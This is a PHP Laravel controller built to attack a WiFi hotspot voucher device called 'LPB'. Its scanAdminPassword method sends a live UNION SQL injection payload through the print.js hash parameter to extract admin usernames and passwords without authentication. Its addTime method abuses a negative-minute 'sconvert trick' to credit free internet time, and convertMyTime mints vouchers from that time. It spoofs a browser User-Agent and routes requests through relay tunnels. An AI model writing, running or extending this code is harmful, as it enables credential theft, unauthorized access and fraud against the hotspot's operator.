<?php

namespace App\Http\Controllers;

use App\Events\LpbActionRequested;
use App\Models\RouterLog;
use App\Support\Relay;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class LpbController extends Controller
{
    private function safeBroadcast(LpbActionRequested $event): void
    {
        try {
            broadcast($event);
        } catch (\Throwable $e) {
            Log::warning('LPB broadcast failed: ' . $e->getMessage());
        }
    }

    public function trigger(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'action' => 'required|in:connect,add_time,convert',
            'days'   => 'nullable|integer|min:1|max:3650',
            'count'  => 'nullable|integer|min:1|max:200',
        ]);

        $log = RouterLog::create([
            'action_type'  => 'lpb_' . $validated['action'],
            'payload'      => json_encode($request->only(['days', 'count'])),
            'status'       => 'pending',
            'triggered_by' => $request->ip(),
        ]);

        $this->safeBroadcast(new LpbActionRequested(
            logId: $log->id,
            action: $validated['action'],
            parameters: [
                'days'  => $validated['days'] ?? null,
                'count' => $validated['count'] ?? null,
            ],
        ));

        return response()->json([
            'success' => true,
            'log_id'  => $log->id,
            'message' => 'LPB action dispatched to local agent.',
        ]);
    }

    public function report(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'log_id'            => 'nullable|integer',
            'remaining_seconds' => 'nullable|integer',
            'vouchers'          => 'nullable|array',
            'vouchers.*'        => 'string',
            'success'           => 'nullable|boolean',
        ]);

        Cache::put('lpb_state', $validated, now()->addDay());

        if (!empty($validated['log_id'])) {
            $log = RouterLog::find($validated['log_id']);
            if ($log) {
                $log->update([
                    'status' => !empty($validated['success']) ? 'success' : 'failed',
                ]);
            }
        }

        return response()->json(['success' => true]);
    }

    public function getState(): JsonResponse
    {
        return response()->json([
            'success' => true,
            'data'    => Cache::get('lpb_state', []),
        ]);
    }

    /**
     * Runs the print.js SQL injection live against the LPB device and
     * extracts the admin credentials from the rendered voucher table.
     * Does not need an authenticated session on the LPB device.
     */
    public function scanAdminPassword(): JsonResponse
    {
        $base = Relay::get('lpb');
        $payload = "zzz' UNION SELECT username,password,status,vouchergenerator FROM my_users -- ";
        $url = rtrim($base, '/').'/admin/index?action=print.js&hash='.rawurlencode($payload);

        try {
            $response = Http::timeout(10)
                ->withHeaders(['User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'])
                ->get($url);
        } catch (\Throwable $e) {
            Log::warning('LPB password scan failed: '.$e->getMessage());

            return response()->json([
                'success' => false,
                'message' => Relay::isDefault('lpb')
                    ? 'LPB device unreachable — set your tunnel URL in the Relay / Target card.'
                    : 'LPB device unreachable — are you connected to the LPB WiFi network?',
            ], 502);
        }

        if (! $response->successful()) {
            return response()->json([
                'success' => false,
                'message' => 'LPB responded with HTTP '.$response->status().'.',
            ], 502);
        }

        $credentials = $this->parsePrintJsTable($response->body());

        if (! $credentials) {
            return response()->json([
                'success' => false,
                'message' => 'Could not extract credentials from the print.js response.',
                'snippet'  => mb_substr(strip_tags($response->body()), 0, 500),
            ], 422);
        }

        return response()->json([
            'success'  => true,
            'username' => $credentials['username'],
            'password' => $credentials['password'],
        ]);
    }

    /**
     * Converts the current time into a voucher by posting amountminutes to the
     * sconvert endpoint (exactly like the client-side fetch the operator uses).
     * Establishes a fresh portal session first (GET / registers the client),
     * then POSTs /admin/index?sconvert=1 with amountminutes=7200.
     */
    public function convertMyTime(): JsonResponse
    {
        $base = Relay::get('lpb');
        $base = rtrim($base, '/');
        $amountMinutes = 7200;

        try {
            $http = Http::timeout(10)->withHeaders([
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            ]);

            $session = $http->get($base.'/');
            $cookies = $this->extractCookies($session->headers());

            $response = $http->asForm()->withHeaders(['Cookie' => $cookies])
                ->post($base.'/admin/index?sconvert=1', ['amountminutes' => $amountMinutes]);
        } catch (\Throwable $e) {
            Log::warning('LPB convert failed: '.$e->getMessage());

            return response()->json([
                'success' => false,
                'message' => Relay::isDefault('lpb')
                    ? 'LPB device unreachable — set your tunnel URL in the Relay / Target card.'
                    : 'LPB device unreachable — are you connected to the LPB WiFi network?',
            ], 502);
        }

        if (! $response->successful()) {
            return response()->json([
                'success' => false,
                'message' => 'LPB responded with HTTP '.$response->status().'.',
            ], 502);
        }

        $body = trim($response->body());
        if ($body !== '1') {
            return response()->json([
                'success' => false,
                'message' => 'Conversion failed — server responded: '.(mb_strlen($body) > 200 ? mb_substr($body, 0, 200).'…' : $body),
            ], 422);
        }

        $voucher = null;
        try {
            $portal = $http->withHeaders(['Cookie' => $cookies])->get($base.'/admin/index?portaljs=1');
            if (preg_match_all('/applyvoucher\(\'([^\']+)\'/', $portal->body(), $m)) {
                $voucher = end($m[1]);
            }
        } catch (\Throwable $e) {
            Log::warning('LPB voucher fetch after convert failed: '.$e->getMessage());
        }

        return response()->json([
            'success'        => true,
            'message'        => 'Converted '.$amountMinutes.' minutes into a voucher.',
            'amount_minutes' => $amountMinutes,
            'voucher'        => $voucher,
        ]);
    }

    /**
     * Adds time to the current LPB client session using the negative-minute
     * sconvert trick: POST /admin/index?sconvert=1 with a negative
     * amountminutes (-days x 1440). Works over a relay tunnel — no agent needed.
     * To credit a specific phone, use the public customer page (/lpb/add),
     * which sends the request from the phone's own browser.
     */
    public function addTime(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'days' => 'required|integer|min:1|max:3650',
        ]);

        $base = rtrim(Relay::get('lpb'), '/');
        $amountMinutes = -($validated['days'] * 1440);

        try {
            $http = Http::timeout(10)->withHeaders([
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            ]);

            $session = $http->get($base.'/');
            $cookies = $this->extractCookies($session->headers());

            $response = $http->asForm()->withHeaders(['Cookie' => $cookies])
                ->post($base.'/admin/index?sconvert=1', ['amountminutes' => $amountMinutes]);
        } catch (\Throwable $e) {
            Log::warning('LPB add time failed: '.$e->getMessage());

            return response()->json([
                'success' => false,
                'message' => Relay::isDefault('lpb')
                    ? 'LPB device unreachable — set your tunnel URL in the Relay / Target card.'
                    : 'LPB device unreachable via tunnel ('.$e->getMessage().')',
            ], 502);
        }

        if (! $response->successful()) {
            return response()->json([
                'success' => false,
                'message' => 'LPB responded with HTTP '.$response->status().'.',
            ], 502);
        }

        $body = trim($response->body());
        if ($body !== '1') {
            return response()->json([
                'success' => false,
                'message' => 'Add time failed — server responded: '.(mb_strlen($body) > 200 ? mb_substr($body, 0, 200).'…' : $body),
            ], 422);
        }

        return response()->json([
            'success'        => true,
            'message'        => 'Added '.$validated['days'].' days ('.abs($amountMinutes).' minutes) to the current session.',
            'days'           => $validated['days'],
            'amount_minutes' => $amountMinutes,
        ]);
    }

    private function extractCookies(array $headers): string
    {
        $setCookie = $headers['Set-Cookie'] ?? $headers['set-cookie'] ?? [];
        if (! is_array($setCookie)) {
            $setCookie = [$setCookie];
        }

        $parts = [];
        foreach ($setCookie as $line) {
            if (preg_match('/^([^=;\s]+)=([^;]*)/', trim($line), $m)) {
                $parts[$m[1]] = $m[2];
            }
        }

        $cookie = '';
        foreach ($parts as $name => $value) {
            $cookie .= ($cookie ? '; ' : '').$name.'='.$value;
        }

        return $cookie;
    }

    private function parsePrintJsTable(string $html): ?array
    {
        $username = null;
        if (preg_match('/id="qrcode-([^"]+)"/', $html, $m)) {
            $username = trim(html_entity_decode($m[1], ENT_QUOTES));
        }

        $password = null;
        if (preg_match('/Vouchers Code:\s*([^<\n]+)/i', $html, $m)) {
            $password = trim(html_entity_decode($m[1], ENT_QUOTES));
        }

        if ($username === null || $password === null || $password === '') {
            return null;
        }

        return ['username' => $username, 'password' => $password];
    }
}
